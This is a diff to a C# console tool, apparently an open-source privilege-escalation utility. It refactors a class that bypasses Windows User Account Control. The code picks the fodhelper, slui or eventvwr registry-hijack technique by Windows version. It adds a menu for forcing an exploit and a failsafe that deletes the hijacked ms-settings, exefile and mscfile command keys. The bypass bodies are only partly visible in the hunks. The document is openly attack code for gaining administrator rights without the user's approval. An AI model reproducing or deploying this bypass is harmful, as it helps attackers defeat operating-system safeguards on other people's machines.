@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using System.Threading;
 using Microsoft.Win32;
 
 namespace Privilege_Escalation
@@ -10,37 +11,96 @@ namespace Privilege_Escalation
     public static class UAC
     {
         /// <summary>
-        ///     Start UAC Bypass
+        /// Start UAC Bypass
         /// </summary>
         public static void Start()
         {
-            var osName =
-                Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "")
-                    .ToString();
-            Console.WriteLine("Using: " + osName);
-            if (!IsRunningAsLocalAdmin())
+            var osName = GetWindowsName();
+
+            if (osName.StartsWith("Windows 10"))
+                BypassFodhelper();
+            else if (osName.StartsWith("Windows 8"))
+                BypassSlui();
+            else if (osName.StartsWith("Windows 7"))
+                BypassEventvwr();
+            else
+                Compatibility();
+        }
+
+        /// <summary>
+        /// Compatibility Mode
+        /// </summary>
+        public static void Compatibility()
+        {
+            Console.Write("\b");
+            Console.WriteLine(@"Compatibility mode enabled.
+Your OS might not be compatible.
+Are you willing to try exploit anyway?
+
+Numpad 1: Windows 7 (EventVwr)
+Numpad 2: Windows 8 (Slui)
+Numpad 3: Windows 10 (Fodhelper)
+Numpad 4: Failsafe, delete all registry sub key");
+
+            ReCall:
+            switch (Console.ReadKey().Key)
             {
-                if (osName.StartsWith("Windows 10"))
-                    BypassFodhelper();
-                else if (osName.StartsWith("Windows 8"))
-                    BypassSlui();
-                else if (osName.StartsWith("Windows 7"))
+                case ConsoleKey.NumPad1:
                     BypassEventvwr();
-                else
-                    Compatibility();
+                    break;
+                case ConsoleKey.NumPad2:
+                    BypassSlui();
+                    break;
+                case ConsoleKey.NumPad3:
+                    BypassFodhelper();
+                    break;
+                case ConsoleKey.NumPad4:
+                    Console.Write("\b");
+                    if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command") != null)
+                    {
+                        Console.WriteLine("fodhelper deleted.");
+                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell\open\command");
+                    }
+                    else
+                    {
+                        Console.WriteLine("fodhelper not found in registry.");
+                    }
+
+                    if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\shell\open\command") != null)
+                    {
+                        Console.WriteLine("slui deleted.");
+                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\exefile\shell\open\command");
+                    }
+                    else
+                    {
+                        Console.WriteLine("slui not found in registry.");
+                    }
+
+                    if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\shell\open\command") != null)
+                    {
+                        Console.WriteLine("eventvwr deleted.");
+                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\mscfile\shell\open\command");
+                    }
+                    else
+                    {
+                        Console.WriteLine("eventvwr not found in registry.");
+                    }
+
+                    Console.WriteLine("Failsafe done, exiting...");
+
+                    Thread.Sleep(5000);
+                    Environment.Exit(0);
+                    break;
+                default:
+                    Console.Write("\b");
+                    Console.WriteLine("Could not identify your choice please try again.");
+                    goto ReCall;
             }
         }
 
-        private static void Compatibility()
-        {
-            Console.WriteLine(
-                "\nYour OS might not be compatible.\nAre you willing to try exploit anyway?\n\nNumpad 1: Windows 7\nNumpad 2: Windows 10");
-            if (Console.ReadKey().Key == ConsoleKey.NumPad1)
-                BypassEventvwr();
-            else
-                BypassFodhelper();
-        }
-
+        /// <summary>
+        /// fodhelper bypass should work on Windows 10
+        /// </summary>
         private static void BypassFodhelper()
         {
             var wow64Value = IntPtr.Zero;
@@ -65,6 +125,9 @@ namespace Privilege_Escalation
             }
         }
 
+        /// <summary>
+        /// Slui bypass should work on Windows 8
+        /// </summary>
         private static void BypassSlui()
         {
             var wow64Value = IntPtr.Zero;
@@ -89,6 +152,9 @@ namespace Privilege_Escalation
             }
         }
 
+        /// <summary>
+        ///     eventvwr bypass should work on Windows 7 and bellow
+        /// </summary>
         private static void BypassEventvwr()
         {
             Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
@@ -100,7 +166,7 @@ namespace Privilege_Escalation
         }
 
         /// <summary>
-        ///     Check if application is running as admin
+        /// Check if application is running as admin
         /// </summary>
         public static bool IsRunningAsLocalAdmin()
         {
@@ -115,6 +181,17 @@ namespace Privilege_Escalation
                     }
 
             return false;
+        }
+
+        /// <summary>
+        /// Get a registry value from ProductName
+        /// </summary>
+        /// <returns>ProductName</returns>
+        public static string GetWindowsName()
+        {
+            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName",
+                    "")
+                .ToString();
         }
 
         private static class Wow64Interop
